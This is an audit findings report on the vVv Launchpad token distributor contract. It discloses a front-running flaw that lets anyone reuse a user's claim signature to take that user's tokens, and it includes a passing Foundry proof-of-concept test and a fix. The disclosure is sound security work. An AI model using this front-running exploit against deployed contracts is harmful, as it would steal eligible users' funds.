# vVv Launchpad - Investments and Token Distribution - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Anyone can steal an eligible KYC'ed user's claim amount in `VVVVCTokenDistributor.sol`](#H-01)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: vVv

### Dates: Nov 14th, 2024 - Nov 17th, 2024

[See more contest details here](https://audits.sherlock.xyz/contests/647)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 1
- Medium: 0
- Low: 0

# High Risk Findings

## <a id='H-01'></a>H-01. Anyone can steal an eligible KYC'ed user's claim amount in `VVVVCTokenDistributor.sol`

## Summary

Transferring the tokens to the caller of the VVVVCTokenDistributor::claim() function essentially allows anyone to steal an eligible KYC'ed user's claim amount by front-running a claim (the protocol is to be deployed on Ethereum Mainnet along with the other L2s).

## Root Cause

Consider the code segment [here](https://github.com/sherlock-audit/2024-11-vvv-exchange-update-mgnfy-view/blob/4ed37676fef5c25a551fe5be3b9acc12bfb6a878/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L130C1-L136C10). The tokens are transferred from the project token proxy wallets to the caller of the VVVVCTokenDistributor::claim() function, instead of the eligible user's KYC address. Anyone can front-run the claim transaction, and use the signature to steal funds.

## Internal pre-conditions

A user needs to be eligible for a claim through VVVVCTokenDistributor.sol.

## External pre-conditions

The claim needs to occur on Ethereum Mainnet where transactions are collected in a mempool and can be front-run.

## Attack Path

1. An eligible user generates a signature to claim tokens via vVv's off-chain service.
2. The user sends the claim transaction which is collected in Ethereum Mainnet's mempool.
3. A malicious user front-runs the claim transaction and uses the same signature to claim tokens to their address.

## Impact

The eligible KYC'ed user loses all his claim amount.

## PoC

Add the following test case to vvv-platform-smart-contracts/test/vc/VVVVCTokenDistributor.unit.t.sol,

```js
    function testAnyoneCanStealAKYCedUsersClaimTokens() public {
        address[] memory thisProjectTokenProxyWallets = new address[](1);
        uint256[] memory thisTokenAmountsToClaim = new uint256[](1);

        thisProjectTokenProxyWallets[0] = projectTokenProxyWallets[0];

        uint256 claimAmount = sampleTokenAmountsToClaim[0];
        thisTokenAmountsToClaim[0] = claimAmount;

        VVVVCTokenDistributor.ClaimParams memory claimParams =
            generateClaimParamsWithSignature(sampleKycAddress, thisProjectTokenProxyWallets, thisTokenAmountsToClaim);

        // Create a malicious user
        address maliciousUser = vm.addr(1000);
        claimAsUser(maliciousUser, claimParams);
        // The malicious user essentially stole the KYC'ed users claim
        assertTrue(ProjectTokenInstance.balanceOf(maliciousUser) == claimAmount);
    }
```

The test passes,

```shell
Ran 1 test for test/vc/VVVVCTokenDistributor.unit.t.sol:VVVVCTokenDistributorUnitTests
[PASS] testAnyoneCanStealAKYCedUsersClaimTokens() (gas: 122037)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.01ms (1.40ms CPU time)
```

## Mitigation

Make the following change to the VVVVCTokenDistributor::claim() function,

```diff
    function claim(ClaimParams memory _params) public {
        // Code here...

        // transfer tokens from each wallet to the caller
        // @audit Anyone can snatch this signature from the mempool and claim tokens because of the msg.sender recipient
        for (uint256 i = 0; i < _params.projectTokenProxyWallets.length; i++) {
            projectToken.safeTransferFrom(
                _params.projectTokenProxyWallets[i],
-               msg.sender,
+              _params.kycAddress,
                _params.tokenAmountsToClaim[i]
            );
        }

        // More code here...
    }
```

This transfers the tokens to the KYC address instead of the sender of the transaction.